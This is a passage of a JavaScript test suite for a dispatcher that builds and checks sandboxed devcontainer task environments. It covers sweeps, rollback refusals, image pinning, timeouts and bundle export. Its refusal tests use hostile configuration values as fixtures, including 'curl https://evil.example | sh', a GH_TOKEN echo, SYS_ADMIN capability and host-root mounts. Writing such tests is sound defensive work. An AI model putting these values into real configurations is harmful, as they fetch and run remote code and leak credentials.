// A run's task environment, in ADR-0062's order (incident-platform backlog #0-277 AC3, AC5, AC6, AC9, AC10, AC11,
// AC13), on the fake daemon and a generic product: a killed run's leftovers are swept and the run starts; the task
// container is made from a fresh clone of the base, from the override, holds /opt/factory read-only and no mount of
// the dispatcher's state, its image recorded by ID; a rollback seen at either check stops the run, and the second
// one leaves the rollback's objects alone; a refusal while setting up the container ends the task BLOCKED, and the
// daemon is swept at the end either way; a call past its limit leaves no process and blocks the task; the task's
// commits leave as a bundle on stdout into the dispatcher's own directory.
import { test, after } from 'node:test';
import assert from 'node:assert/strict';
import { existsSync, readFileSync } from 'node:fs';
import { mkdir, readdir, readFile, stat, writeFile } from 'node:fs/promises';
import { join } from 'node:path';

import { DaemonOptionsError, RollbackRunningError } from '../src/container/daemon.mjs';
import {
  inTaskEnvironment as underTaskLock, refuseOffEnvironment, setUpTaskContainer, sweepForRun,
} from '../src/container/environment.mjs';
import { bundleFromTask } from '../src/container/task-bundle.mjs';
import { CallTimeoutError, callInTask, execInTask, readTaskConfig } from '../src/container/task-container.mjs';
import { TASK_CONFIG_LIST, buildOverride, imageBuildConfig } from '../src/container/task-config.mjs';
import { initBare } from '../src/git/config-allowlist.mjs';
import { loadBundle } from '../src/git/bundle.mjs';
import { createTask, loadTask, updateTask } from '../src/state/tasks.mjs';
import { makeFakeDaemon, plantedContainer } from '../testing/fake-daemon.mjs';
import { REAL_GIT, git } from '../testing/git-fixtures.mjs';
import { HELPER_IMAGE, makeStateDir } from '../testing/state-dir.mjs';
import {
  CONFIG, CONFIG_PATH, FEATURE, FEATURE_DIGEST, FEATURE_REF, makeTaskProduct,
} from '../testing/task-product.mjs';

/**
 * A run's environment as cli.mjs composes it when no other task is live (incident-platform backlog #0-303): the slot
 * section's start (the daemon's options, the rollback, the whole daemon swept), the run under its task's lock, and the
 * sweep at its end; the locks themselves are cli.mjs's, tested there.
 */
async function inTaskEnvironment({ runId, helperImage, stateDir, sudo }, inside) {
  await refuseOffEnvironment({ stateDir, sudo });
  const { removed: swept } = await sweepForRun({ runId, helperImage, stateDir, sudo, othersLive: [] });
  const result = await underTaskLock({ runId, stateDir, sudo,
    sweepAtEnd: () => sweepForRun({ runId, helperImage, stateDir, sudo, othersLive: [] }) }, inside);
  return { result, swept };
}

const root = await makeStateDir();
after(root.remove);
let n = 0;
const RUN_ID = '20261120T101500Z-3f9a1c';
const OLD_RUN = '20261119T090000Z-0a0b0c';

async function setUp({ product: productOptions, initial } = {}) {
  n += 1;
  const dir = join(root.dir, `case-${n}`);
  await mkdir(dir);
  const stateDir = join(dir, 'state');
  await mkdir(stateDir, { mode: 0o700 });
  const product = await makeTaskProduct(dir, productOptions);
  const fake = makeFakeDaemon(dir, initial);
  const options = { stateDir, repoDir: product.repoDir, adapter: { taskImage: CONFIG_PATH }, helperImage: HELPER_IMAGE,
    ...fake.runner, git: REAL_GIT };
  return { dir, stateDir, product, fake, options };
}

const isEmpty = async (fake) => {
  const state = fake.read();
  assert.deepEqual(state.containers.map((c) => c.name), []);
  assert.deepEqual(state.networks.map((x) => x.name).sort(), ['bridge', 'host', 'none']);
  assert.ok(state.volumes.every((v) => v.name === 'factory-dispatcher-m2'), state.volumes.map((v) => v.name).join());
  assert.deepEqual(await readdir(fake.tasks), []);
};

const steps = (fake) => fake.calls().map((c) => (c.program === 'devcontainer' ? `devcontainer ${c.args[0]}`
  : [c.args[0], ['network', 'volume', 'container', 'image'].includes(c.args[0]) ? c.args[1] : null,
    c.args.includes('label=factory.rollback') ? '(rollback)' : null].filter(Boolean).join(' ')));

test('AC13, AC3, AC5: after a killed run, its leftovers are swept and the run starts; the task container is made from '
  + 'a fresh clone, holds /opt/factory read-only and nothing of the state, its image recorded; all removed at the end',
async () => {
  const { stateDir, product, fake, options } = await setUp({ initial: {
    containers: [plantedContainer({ name: 'task-old', labels: { 'factory.task': OLD_RUN } }),
      plantedContainer({ name: 'testcontainers-kafka' })],
    volumes: [{ name: `factory-task-${OLD_RUN}-claude`, labels: { 'factory.task': OLD_RUN } }],
  } });
  await mkdir(join(fake.tasks, OLD_RUN, 'w', '.git'), { recursive: true });
  let seen;
  const { result, swept } = await inTaskEnvironment({ runId: RUN_ID, helperImage: HELPER_IMAGE, ...fake.runner },
    async () => {
      const ready = await setUpTaskContainer({ ...options, task: await createTask(stateDir, { runId: RUN_ID }) });
      const state = fake.read();
      const container = state.containers.find((c) => c.labels['factory.task'] === RUN_ID);
      seen = { ready, container, override: JSON.parse(await readFile(join(fake.tasks, RUN_ID, 'devcontainer.json'), 'utf8')),
        build: JSON.parse(await readFile(join(fake.tasks, RUN_ID, 'build', 'devcontainer.json'), 'utf8')),
        lock: JSON.parse(await readFile(join(fake.tasks, RUN_ID, 'build', 'devcontainer-lock.json'), 'utf8')),
        clone: git(join(fake.tasks, RUN_ID, 'w'), ['status', '--porcelain', '--ignored']),
        head: git(join(fake.tasks, RUN_ID, 'w'), ['rev-parse', 'HEAD']), networks: state.networks.map((x) => x.name),
        volumes: state.volumes.map((v) => v.name) };
      return ready.task;
    });
  assert.equal(swept.containers.length, 2, 'task-old and testcontainers-kafka, by their IDs');
  assert.equal(seen.ready.task.status, 'running', seen.ready.task.reason);
  assert.equal(seen.head, product.base, 'the clone is the base');
  assert.equal(result.baseSha, product.base);
  assert.equal(result.imageId, seen.container.image, 'the image recorded by its ID');
  assert.match(result.imageId, /^sha256:[0-9a-f]{64}$/);
  assert.deepEqual(await loadTask(stateDir, RUN_ID), result);
  const carried = await readTaskConfig({ repoDir: product.repoDir, base: product.base, path: CONFIG_PATH, git: REAL_GIT });
  // #0-284: the build's configuration, then the override up reads, the image by the ID the build gave.
  assert.deepEqual(seen.build, imageBuildConfig(carried, { runId: RUN_ID }));
  assert.deepEqual(seen.override, buildOverride(carried, { runId: RUN_ID, imageId: result.imageId }));
  // `--config` with the task's override, never `--override-config`: the CLI writes its lockfile beside the
  // configuration file, and `factory` may not write in the clone (the VM's run of 2026-11-20).
  const [build, up] = fake.calls().filter((c) => c.program === 'devcontainer');
  assert.deepEqual(build.args, ['build', '--config', `/home/factory/tasks/${RUN_ID}/build/devcontainer.json`,
    '--workspace-folder', `/home/factory/tasks/${RUN_ID}/w`, '--image-name', 'factory-task-20261120t101500z-3f9a1c',
    '--log-format', 'json']);
  assert.deepEqual(up.args.slice(0, 5), ['up', '--config', `/home/factory/tasks/${RUN_ID}/devcontainer.json`,
    '--workspace-folder', `/home/factory/tasks/${RUN_ID}/w`]);
  assert.ok(!up.args.includes('--override-config'), up.args.join(' '));
  assert.deepEqual(Object.keys(seen.lock.features), [FEATURE_REF], 'the CLI\'s lockfile, beside the build\'s configuration');
  assert.equal(seen.clone, '', 'the clone is left as it was cloned');
  const mounts = seen.container.mounts.map((m) => `${m.Type} ${m.Name ?? m.Source} ${m.Destination} ${m.RW ? 'rw' : 'ro'}`);
  assert.deepEqual(mounts.sort(), [
    `bind /home/factory/tasks/${RUN_ID}/w /workspace rw`,
    'bind /opt/factory-checkout /opt/factory ro',
    'bind /opt/factory-checkout/claude-code/etc /etc/claude-code ro',
    'bind /var/run/docker.sock /var/run/docker-host.sock rw',
    `volume factory-task-${RUN_ID}-claude /home/dev/.claude rw`,
    'volume factory-dispatcher-m2 /home/dev/.m2 rw',
  ].sort());
  assert.ok(mounts.every((m) => !m.includes(stateDir)), 'AC10: nothing of the dispatcher\'s state is mounted');
  assert.ok(seen.networks.includes(`factory-task-${RUN_ID}`));
  assert.deepEqual(seen.volumes.sort(), ['factory-dispatcher-m2', `factory-task-${RUN_ID}-claude`]);
  const order = steps(fake);
  const first = (s, from = 0) => order.indexOf(s, from);
  const network = first('network create');
  assert.deepEqual(order.slice(0, 2), ['info', 'ps (rollback)'], 'the daemon\'s options and the rollback first');
  assert.ok(first('rm') < network && first('run') < network, 'the sweep before the run is visible');
  assert.equal(order[network + 1], 'ps (rollback)', 'the second check right after the network');
  assert.ok(network < first('devcontainer up'), 'and before the task container');
  // #0-284: the daemon's options before the run's first container, the sweep's helper included (review round 1 of
  // factory#22); then the build, the ID, the label, and up.
  assert.equal(first('info'), 0);
  assert.ok(first('info') < first('run'), 'docker info before the sweep\'s helper');
  assert.equal(order.filter((x) => x === 'info').length, 1, 'once for the run');
  const built = first('devcontainer build');
  assert.ok(built > network && first('image inspect', built) > built, 'the ID read after the build');
  assert.ok(first('image inspect', first('image inspect', built) + 1) < first('devcontainer up'),
    'the label checked before up');
  assert.ok(first('exec') > first('container inspect'), 'the probe of timeout after the checks');
  assert.ok(first('rm', first('devcontainer up')) > 0, 'the sweep at the end');
  await isEmpty(fake);
});

test('AC13: a rollback starting while the run builds is seen by the second check: the run stops, removing only its '
  + 'own objects', async () => {
  const rollback = plantedContainer({ name: 'rollback', labels: { 'factory.rollback': '1' },
    volumes: ['incident-platform-gh', 'incident-platform-claude'] });
  const { fake } = await setUp({ initial: {
    volumes: [{ name: 'incident-platform-gh', labels: {} }, { name: 'incident-platform-claude', labels: {} }],
  } });
  let inside = false;
  const env = { runId: RUN_ID, helperImage: HELPER_IMAGE, ...fake.runner };
  fake.update((s) => {
    s.volumes = [];
    s.scenario.after = { 'network create': [rollback] };
  });
  await assert.rejects(inTaskEnvironment(env, async () => { inside = true; }), (error) => {
    assert.ok(error instanceof RollbackRunningError);
    assert.match(error.message, /^the run is refused after its network was made: a running container carries factory\.rollback: rollback/);
    return true;
  });
  assert.equal(inside, false, 'no task container is made');
  const state = fake.read();
  assert.deepEqual(state.containers.map((c) => [c.name, c.running]), [['rollback', true]], 'the rollback is not swept');
  assert.ok(!state.networks.some((x) => x.name === `factory-task-${RUN_ID}`), 'the run\'s own network is removed');
  assert.ok(!steps(fake).includes('devcontainer up'));
  const after = steps(fake).slice(steps(fake).lastIndexOf('ps (rollback)') + 1);
  assert.ok(!after.includes('rm') && !after.includes('volume rm') && !after.includes('run'), `no sweep: ${after}`);
});

test('review round 1 gen-5c1e: the second check\'s refusal wins when the run\'s own objects cannot be removed: no '
  + 'sweep follows, the rollback and its logins survive', async () => {
  const rollback = plantedContainer({ name: 'rollback', labels: { 'factory.rollback': '1' },
    volumes: ['incident-platform-gh', 'incident-platform-claude'] });
  const { fake } = await setUp();
  fake.update((s) => {
    s.scenario.after = { 'network create': [rollback] };
    s.scenario.networkRmFails = true;
    s.scenario.afterVolumes = { 'network create': [{ name: 'incident-platform-gh', labels: {} },
      { name: 'incident-platform-claude', labels: {} }] };
  });
  const env = { runId: RUN_ID, helperImage: HELPER_IMAGE, ...fake.runner };
  await assert.rejects(inTaskEnvironment(env, async () => {}), (error) => {
    assert.ok(error instanceof RollbackRunningError, `${error.constructor.name}: ${error.message}`);
    assert.match(error.message, /^the run is refused after its network was made: a running container carries factory\.rollback: rollback .*; and the run's own objects could not all be removed: docker network rm failed \(exit 1\)/);
    return true;
  });
  const state = fake.read();
  assert.deepEqual(state.containers.map((c) => [c.name, c.running]), [['rollback', true]], 'the rollback survives');
  assert.deepEqual(state.volumes.map((v) => v.name).sort(), ['incident-platform-claude', 'incident-platform-gh'],
    'and its logins');
  const after = steps(fake).slice(steps(fake).lastIndexOf('ps (rollback)') + 1);
  assert.deepEqual(after.filter((c) => ['rm', 'volume rm', 'run'].includes(c)), [], `no sweep after the refusal: ${after}`);
});

test('AC13: a running rollback refuses the run at its start, and nothing is removed', async () => {
  const { fake } = await setUp({ initial: { containers: [plantedContainer({ name: 'rollback',
    labels: { 'factory.rollback': '1' } }), plantedContainer({ name: 'testcontainers' })] } });
  await assert.rejects(inTaskEnvironment({ runId: RUN_ID, helperImage: HELPER_IMAGE, ...fake.runner }, async () => {}),
    /^RollbackRunningError|the run is refused: a running container carries factory\.rollback: rollback/);
  assert.deepEqual(steps(fake), ['info', 'ps (rollback)']);
  assert.equal(fake.read().containers.length, 2);
});

/**
 * Whether `pid` runs: a zombie does not (in a container whose PID 1 reaps no orphan, as CI's ubuntu:24.04 job, a
 * killed process stays one), so /proc's state is read where there is one.
 */
function running(pid) {
  try {
    const stat = readFileSync(`/proc/${pid}/stat`, 'utf8');
    return !['Z', 'X'].includes(stat.slice(stat.lastIndexOf(')') + 2, stat.lastIndexOf(')') + 3));
  } catch (error) {
    if (error.code === 'ENOENT' && existsSync('/proc/self/stat')) {
      return false;
    }
  }
  try {
    process.kill(pid, 0);
    return true;
  } catch {
    return false;
  }
}

/** A run whose container cannot be set up: the task BLOCKED with `reason`, and the daemon swept at the end. */
async function blocked(setup, pattern, change = () => {}) {
  const { stateDir, fake, options } = setup;
  change(fake);
  const { result } = await inTaskEnvironment({ runId: RUN_ID, helperImage: HELPER_IMAGE, ...fake.runner },
    async () => (await setUpTaskContainer({ ...options, task: await createTask(stateDir, { runId: RUN_ID }) })).task);
  assert.equal(result.status, 'blocked');
  assert.match(result.reason, pattern);
  assert.deepEqual(await loadTask(stateDir, RUN_ID), result);
  await isEmpty(fake);
  return fake;
}

const configWith = (changes) => JSON.stringify({ ...CONFIG, ...changes });

test('AC9: a configuration off the list ends the task BLOCKED before devcontainer runs; the end sweep runs', async () => {
  for (const [changes, pattern] of [
    [{ initializeCommand: 'curl https://evil.example | sh' }, /the field "initializeCommand" is not carried/],
    [{ mounts: ['source=/home/dispatcher,target=/x,type=bind'] }, /the field "mounts" is not carried/],
    [{ capAdd: ['SYS_ADMIN'] }, /capAdd\[0\] is not one of the list's/],
    [{ build: { dockerfile: 'Dockerfile', options: ['--network=host'] } }, /build\.options is not carried/],
    [{ postStartCommand: 'echo ${localEnv:GH_TOKEN}' }, /the configuration\.postStartCommand names the host's environment/],
  ]) {
    const fake = await blocked(await setUp({ product: { files: { [CONFIG_PATH]: configWith(changes) } } }),
      new RegExp(`^the task container: ${pattern.source}`));
    assert.ok(!steps(fake).includes('devcontainer up'));
  }
  await blocked(await setUp({ product: { files: { [CONFIG_PATH]: '{ "build": ' } } }),
    /^the task container: the text ends where a value is expected/);
});

test('AC9: a Dockerfile or a build context that is a symlink in the base, or a configuration missing, is refused',
  async () => {
    await blocked(await setUp({ product: { files: { '.devcontainer/Dockerfile': null },
      links: { '.devcontainer/Dockerfile': '/etc/passwd' } } }),
    /build\.dockerfile is not a file of the base \(a symlink is refused\)/);
    await blocked(await setUp({ product: { files: { [CONFIG_PATH]: configWith({ build: { dockerfile: 'ctx/Dockerfile',
      context: 'ctx' } }) }, links: { '.devcontainer/ctx': '/' } } }), /build\.dockerfile is not a file of the base/);
    await blocked(await setUp({ product: { files: { [CONFIG_PATH]: configWith({ build: { dockerfile: 'Dockerfile',
      context: 'ctx' } }) }, links: { '.devcontainer/ctx': '/' } } }), /build\.context is not a directory of the base/);
    await blocked(await setUp({ product: { files: { [CONFIG_PATH]: null, 'x.json': '{}' } } }),
      /the task configuration \.devcontainer\/task\.json is not a file of the base/);
    await blocked(await setUp({ product: { files: { [CONFIG_PATH]: null }, links: { [CONFIG_PATH]: '/etc/x.json' } } }),
      /is not a file of the base \(a symlink is refused\)/);
    const setup = await setUp();
    for (const taskImage of ['-x.json', '../x.json', '.devcontainer/../../x.json', '/etc/x.json', 'x.yaml', './x.json']) {
      await assert.rejects(readTaskConfig({ repoDir: setup.product.repoDir, base: setup.product.base, path: taskImage,
        git: REAL_GIT }), /taskImage must be a relative path to a \.json in the product, not starting with -/);
    }
  });

test('AC9, AC3: the built image\'s metadata off the list, a mount, privilege or capability the dispatcher did not ask '
  + 'for, or a failed up, end the task BLOCKED', async () => {
  await blocked(await setUp(), /devcontainer\.metadata\[0\], the feature .* is not what the feature declares/, (fake) => {
    fake.update((s) => { s.scenario.imageLabels = { 'devcontainer.metadata': JSON.stringify([{
      id: 'ghcr.io/devcontainers/features/docker-outside-of-docker:1', entrypoint: '/usr/local/share/docker-init.sh',
      securityOpt: ['label=disable'], privileged: true,
      mounts: [{ source: '/var/run/docker.sock', target: '/var/run/docker-host.sock', type: 'bind' }] }]) }; });
  });
  await blocked(await setUp(), /devcontainer\.metadata\[2\] holds a key off the list, its key 0 \(not named\)/, (fake) => {
    fake.update((s) => { s.scenario.imageLabels = { 'devcontainer.metadata': JSON.stringify([{ id: FEATURE_REF,
      ...TASK_CONFIG_LIST.features[FEATURE].digests[FEATURE_DIGEST].metadata }, { remoteUser: 'dev' },
    { mounts: ['type=bind,source=/,target=/host'] }]) }; });
  });
  await blocked(await setUp(), /the task container's mounts are not the dispatcher's: 1 unexpected, at Mounts\[6\] \(not named\)$/, (fake) => {
    fake.update((s) => { s.scenario.extraMounts = [{ Type: 'bind', Source: '/srv/state', Destination: '/state', RW: true }]; });
  });
  await blocked(await setUp(), /HostConfig\.Privileged is neither what the dispatcher set nor Docker's default/, (fake) => {
    fake.update((s) => { s.scenario.privileged = true; });
  });
  await blocked(await setUp(), /devcontainer up failed \(exit 1\); its stderr, the agent's side's, is not quoted: it is kept in \S+$/, (fake) => {
    fake.update((s) => { s.scenario.upFails = true; });
  });
  await blocked(await setUp(), /the work directory of .* could not be made/, (fake) => {
    fake.update((s) => { s.scenario.helperFails = 'clone'; });
  });
});

test('AC5: a task resumed runs a container of the image it recorded, never one it builds again; another image is '
  + 'refused', async () => {
  const setup = await setUp();
  const { stateDir, fake, options } = setup;
  const imageId = `sha256:${'c'.repeat(64)}`;
  const label = { 'devcontainer.metadata': JSON.stringify([{ id: FEATURE_REF, ...TASK_CONFIG_LIST.features[FEATURE]
    .digests[FEATURE_DIGEST].metadata }, { remoteUser: 'dev' }]) };
  fake.update((s) => { s.images[imageId] = { labels: label }; });
  const task = await updateTask(stateDir, await createTask(stateDir, { runId: RUN_ID }), { imageId });
  const ready = await setUpTaskContainer({ ...options, task });
  assert.equal(ready.task.status, 'running', ready.task.reason);
  assert.equal(ready.task.imageId, imageId);
  const override = JSON.parse(await readFile(join(fake.tasks, RUN_ID, 'devcontainer.json'), 'utf8'));
  assert.equal(override.image, imageId);
  assert.equal(override.build, undefined);
  const other = await setUp();
  other.fake.update((s) => { s.images[imageId] = { labels: label }; s.scenario.runImage = `sha256:${'d'.repeat(64)}`; });
  const resumed = await updateTask(other.stateDir, await createTask(other.stateDir, { runId: RUN_ID }), { imageId });
  const refused = await setUpTaskContainer({ ...other.options, task: resumed });
  assert.equal(refused.task.status, 'blocked');
  assert.match(refused.task.reason, /runs sha256:d{64}, not the image checked and recorded for the task, sha256:c{64}/);
});

test('AC11: a call that ignores SIGTERM is killed after its grace, leaves no process, and blocks the task',
  { timeout: 20_000 }, async () => {
    const { stateDir, fake, options } = await setUp();
    const { task, container } = await setUpTaskContainer({ ...options,
      task: await createTask(stateDir, { runId: RUN_ID }) });
    const work = join(fake.tasks, RUN_ID, 'w');
    const left = await callInTask({ stateDir, task, container, ...fake.runner, limitS: 1, graceS: 1,
      args: ['sh', '-c', "trap '' TERM; echo $$ > pid; while :; do sleep 1; done"] });
    assert.equal(left.result, null);
    assert.equal(left.task.status, 'blocked');
    assert.match(left.task.reason, /^the call sh in the task container ran past 1 s \(timeout's exit 137\): its processes were ended$/);
    assert.deepEqual(await loadTask(stateDir, RUN_ID), left.task);
    const pid = Number((await readFile(join(work, 'pid'), 'utf8')).trim());
    assert.equal(running(pid), false, 'no process is left');
    assert.ok(fake.calls().some((c) => c.args[0] === 'kill'), 'the task\'s containers killed by their label');
    const exec = fake.calls().find((c) => c.args[0] === 'exec' && c.args.some((a) => a.includes('trap')));
    assert.deepEqual(exec.args.slice(0, 6), ['exec', '-i', '--user', 'dev', '-w', '/workspace']);
    assert.deepEqual(exec.args.slice(7, 13), ['/usr/bin/timeout', '-s', 'TERM', '-k', '1s', '1s']);
  });

test('AC11: a call whose CLI hangs, an orphan holding its output, is ended by the dispatcher\'s own timer',
  { timeout: 20_000 }, async () => {
    const { stateDir, fake, options } = await setUp();
    const { container } = await setUpTaskContainer({ ...options, task: await createTask(stateDir, { runId: RUN_ID }) });
    fake.update((s) => { s.scenario.execHangs = true; });
    await assert.rejects(execInTask({ container, ...fake.runner, limitS: 1, graceS: 1, marginS: 1, args: ['sleep', '9'] }),
      (error) => {
        assert.ok(error instanceof CallTimeoutError);
        assert.match(error.message, /ran past 1 s and was killed: docker exec ran past 3000 ms: stopped/);
        return true;
      });
    const orphans = fake.read().containers.find((c) => c.id === container.id);
    assert.equal(orphans.running, false, 'killed by the label');
    assert.deepEqual(orphans.pids, []);
    await assert.rejects(execInTask({ container, args: ['x'], limitS: 0 }), TypeError);
    await assert.rejects(execInTask({ container, ...fake.runner, args: ['x'], limitS: 1, env: { 'A B': 'x' } }),
      /is not a variable's name/);
  });

test('AC6: the task\'s commits leave as git bundle create - on exec\'s stdout, into the dispatcher\'s own directory, '
  + 'and the bundle reader takes them', async () => {
  const { stateDir, product, fake, options } = await setUp();
  const { container } = await setUpTaskContainer({ ...options, task: await createTask(stateDir, { runId: RUN_ID }) });
  const work = join(fake.tasks, RUN_ID, 'w');
  await writeFile(join(work, 'change'), 'a task\'s change\n');
  git(work, ['add', 'change']);
  git(work, ['commit', '-q', '-m', 'a task\'s commit']);
  const sha = git(work, ['rev-parse', 'HEAD']);
  const { path, bundle } = await bundleFromTask({ stateDir, container, prerequisite: product.base,
    ref: 'refs/heads/base', ...fake.runner });
  assert.ok(path.startsWith(join(stateDir, 'tasks', RUN_ID, 'bundles') + '/'));
  assert.equal((await stat(path)).mode & 0o777, 0o600);
  assert.deepEqual(await readFile(path), bundle);
  const exec = fake.calls().filter((c) => c.args[0] === 'exec').at(-1);
  assert.deepEqual(exec.args.slice(-7), ['git', '-c', 'core.hooksPath=/dev/null', '-c', 'core.fsmonitor=', 'bundle',
    'create', '-', `${product.base}..refs/heads/base`].slice(-7));
  const repo = join(stateDir, 'tasks', RUN_ID, 'check.git');
  await initBare(join(stateDir, 'tasks', RUN_ID), repo, { git: REAL_GIT });
  await mkdir(join(repo, 'objects', 'info'), { recursive: true });
  await writeFile(join(repo, 'objects', 'info', 'alternates'), `${join(product.repoDir, 'objects')}\n`);
  await loadBundle({ gitDir: repo, bundle, prerequisite: product.base, ref: { sha, name: 'refs/heads/base' }, git: REAL_GIT });
  for (const bad of [{ prerequisite: 'x' }, { ref: 'main' }, { ref: 'refs/heads/../x' }, { ref: '-x' }]) {
    await assert.rejects(bundleFromTask({ stateDir, container, prerequisite: product.base, ref: 'refs/heads/base',
      ...fake.runner, ...bad }), TypeError);
  }
});

test('review round 1 N1: what devcontainer, docker or the task container write to stderr reaches no refusal and no '
  + 'reason in task.json', async () => {
  // Put together at run time from two parts, so that no file of the repository holds text shaped like a secret.
  const secret = 'ghs' + `_${'q'.repeat(36)}`;
  const leaked = (text) => text.includes(secret) || text.includes('ghs_');
  const up = await setUp();
  const fromUp = await blocked(up, /^the task container: devcontainer up failed \(exit 1\); its stderr, the agent's side's, is not quoted: it is kept in \S+$/,
    (fake) => { fake.update((s) => { s.scenario.upFails = `error: ${secret}`; }); });
  assert.ok(fromUp);
  assert.ok(!leaked(await readFile(join(up.stateDir, 'tasks', RUN_ID, 'task.json'), 'utf8')));
  const probe = await setUp();
  await blocked(probe, /^the task container: the task image cannot run a call under timeout \(exit 3\): the image must hold coreutils' timeout \(its stderr, the agent's side's, is not quoted: it is kept in \S+\)$/,
    (fake) => { fake.update((s) => { s.scenario.execFails = { stderr: `timeout: ${secret}`, code: 3 }; }); });
  assert.ok(!leaked(await readFile(join(probe.stateDir, 'tasks', RUN_ID, 'task.json'), 'utf8')));
  const out = await setUp();
  const { container } = await setUpTaskContainer({ ...out.options, task: await createTask(out.stateDir, { runId: RUN_ID }) });
  out.fake.update((s) => { s.scenario.execFails = { stderr: `fatal: ${secret}`, code: 128 }; });
  await assert.rejects(bundleFromTask({ stateDir: out.stateDir, container, prerequisite: out.product.base,
    ref: 'refs/heads/base', ...out.fake.runner }), (error) => {
    assert.match(error.message, /^git bundle create in the task container failed \(exit 128\); its stderr, the agent's side's, is not quoted: it is kept in \S+$/);
    assert.ok(!leaked(error.message));
    return true;
  });
});

test('a call that exits 124, timeout\'s own code for its limit, is taken as its timeout', async () => {
  const { stateDir, options, fake } = await setUp();
  const { container } = await setUpTaskContainer({ ...options, task: await createTask(stateDir, { runId: RUN_ID }) });
  assert.equal((await execInTask({ container, ...fake.runner, limitS: 5, args: ['sh', '-c', 'exit 123'] })).code, 123);
  await assert.rejects(execInTask({ container, ...fake.runner, limitS: 5, args: ['sh', '-c', 'exit 124'] }),
    /^Error: the call sh in the task container ran past 5 s \(timeout's exit 124\): its processes were ended$/);
  assert.equal(fake.read().containers.find((c) => c.id === container.id).running, false, 'killed by the label');
});

test('#0-278: a task image without the tools the product\'s commands run with blocks the task, at setup', async () => {
  const { stateDir, fake, options } = await setUp();
  const secret = 'ghs' + `_${'q'.repeat(36)}`;
  fake.update((s) => { s.scenario.execFails = { stderr: `tar: ${secret}`, code: 1, when: 'command -v' }; });
  const { task, container } = await setUpTaskContainer({ ...options, task: await createTask(stateDir, { runId: RUN_ID }) });
  assert.equal(container, null);
  assert.equal(task.status, 'blocked');
  assert.match(task.reason, /^the task container: the task image cannot run the product's commands from the base \(exit 1\): the image must hold sh, mktemp, tar, rm \(its stderr, the agent's side's, is not quoted: it is kept in \S+\)$/);
  assert.ok(!task.reason.includes('ghs_'));
  assert.ok(fake.calls().filter((c) => c.args[0] === 'exec').length >= 2, 'after the probe of timeout');
});

// incident-platform backlog #0-284: the task container is checked before anything runs in it.

const SECRET = () => 'ghs' + `_${'s'.repeat(36)}`;

test('#0-284 AC1: the build is a call of its own, to a name unique to the run; a label off the list ends the task with '
  + 'no container of the task\'s, no lifecycle command and no ID recorded', async () => {
  const setup = await setUp();
  const fake = await blocked(setup, /^the task container: the image's devcontainer\.metadata\[1\] holds a key off the list/,
    (f) => {
      f.update((s) => {
        s.scenario.imageLabels = { 'devcontainer.metadata': JSON.stringify([{ id: FEATURE_REF,
          ...TASK_CONFIG_LIST.features[FEATURE].digests[FEATURE_DIGEST].metadata },
        { initializeCommand: 'touch /tmp/ran', postCreateCommand: 'touch /tmp/ran' }]) };
      });
    });
  const order = steps(fake);
  assert.ok(order.includes('devcontainer build'), order.join());
  assert.ok(!order.includes('devcontainer up'), 'no up: no container of the task\'s, no lifecycle command');
  assert.ok(!order.slice(order.indexOf('devcontainer build')).includes('exec'), 'nothing runs in a container');
  const build = fake.calls().find((c) => c.program === 'devcontainer');
  assert.equal(build.args[build.args.indexOf('--image-name') + 1], 'factory-task-20261120t101500z-3f9a1c');
  assert.equal((await loadTask(setup.stateDir, RUN_ID)).imageId, null, 'an image refused is not recorded');
  // Another run's build has its own name.
  const other = await setUp();
  const second = '20261120T101600Z-0a1b2c';
  await setUpTaskContainer({ ...other.options, task: await createTask(other.stateDir, { runId: second }) });
  const otherBuild = other.fake.calls().find((c) => c.program === 'devcontainer');
  assert.equal(otherBuild.args[otherBuild.args.indexOf('--image-name') + 1], 'factory-task-20261120t101600z-0a1b2c');
});

test('#0-284 AC2: a new task and a resumed one start the same way, from the image\'s ID: up\'s configuration has the '
  + 'image and no build nor feature, and a container of another image is refused', async () => {
  const fresh = await setUp();
  const made = await setUpTaskContainer({ ...fresh.options, task: await createTask(fresh.stateDir, { runId: RUN_ID }) });
  assert.equal(made.task.status, 'running', made.task.reason);
  const upConfig = JSON.parse(await readFile(join(fresh.fake.tasks, RUN_ID, 'devcontainer.json'), 'utf8'));
  assert.equal(upConfig.image, made.task.imageId);
  assert.equal(upConfig.build, undefined);
  assert.equal(upConfig.features, undefined);
  const tagged = fresh.fake.read().tags['factory-task-20261120t101500z-3f9a1c'];
  assert.equal(made.task.imageId, tagged, 'the ID read from the build\'s name');
  assert.equal(made.container.imageId, tagged);
  // Resumed: the same calls but the build and the reading of the ID, the same configuration for up.
  const again = await setUp();
  again.fake.update((s) => { s.images[made.task.imageId] = fresh.fake.read().images[made.task.imageId]; });
  const resumed = await setUpTaskContainer({ ...again.options,
    task: await updateTask(again.stateDir, await createTask(again.stateDir, { runId: RUN_ID }),
      { imageId: made.task.imageId }) });
  assert.equal(resumed.task.status, 'running', resumed.task.reason);
  assert.deepEqual(JSON.parse(await readFile(join(again.fake.tasks, RUN_ID, 'devcontainer.json'), 'utf8')), upConfig);
  const without = (fake) => steps(fake).filter((x) => x !== 'devcontainer build' && x !== 'run');
  assert.deepEqual(without(again.fake), without(fresh.fake).filter((x, i, all) => !(x === 'image inspect'
    && all.indexOf('image inspect') === i)), 'the same steps, the ID read once for the new task alone');
  // A container of another image, new or resumed, is refused.
  for (const resume of [false, true]) {
    const other = await setUp();
    other.fake.update((s) => { s.scenario.runImage = `sha256:${'d'.repeat(64)}`; });
    let task = await createTask(other.stateDir, { runId: RUN_ID });
    if (resume) {
      other.fake.update((s) => { s.images[made.task.imageId] = fresh.fake.read().images[made.task.imageId]; });
      task = await updateTask(other.stateDir, task, { imageId: made.task.imageId });
    }
    const refused = await setUpTaskContainer({ ...other.options, task });
    assert.equal(refused.task.status, 'blocked');
    assert.match(refused.task.reason, /runs sha256:d{64}, not the image checked and recorded for the task, sha256:/);
  }
});

/** The VM's daemon's security options, and every way off them, with what the refusal says. */
const VM_OPTIONS = ['name=seccomp,profile=builtin', 'name=rootless', 'name=cgroupns'];
const OFF_THE_VM = [
  [{ SecurityOptions: ['name=rootless', 'name=cgroupns'] }, /missing name=seccomp,profile=builtin, 0 other entries/],
  [{ SecurityOptions: ['name=seccomp,profile=builtin', 'name=cgroupns'] }, /missing name=rootless, 0 other/],
  [{ SecurityOptions: ['name=seccomp,profile=builtin', 'name=rootless'] }, /missing name=cgroupns, 0 other/],
  [{ SecurityOptions: ['name=seccomp,profile=unconfined', 'name=rootless', 'name=cgroupns'] },
    /missing name=seccomp,profile=builtin, 1 other entry \(not quoted\)/],
